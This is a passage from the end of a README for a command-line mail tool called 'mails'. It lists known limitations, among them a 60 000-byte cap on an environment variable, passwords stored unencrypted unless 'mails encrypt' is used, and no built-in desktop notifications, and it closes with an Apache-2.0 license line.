  both `mails check` and `mails watch` warn about rules that do not.
- **A single environment value stops at 128 KiB.** `MAILS_BODY_FULL` is capped
  at 60 000 bytes (and sets `MAILS_BODY_TRUNCATED=1`), because Linux refuses a
  larger `execve` environment. Write the message to a file when you need every
  byte.
- **Plain passwords are still accepted** for compatibility with password
  helpers, but they are not encrypted at rest. Prefer `mails encrypt`.
- **No desktop notification backend.** Call `notify-send`,
  `terminal-notifier`, `logger` or your own script from a rule.

## License

Apache-2.0
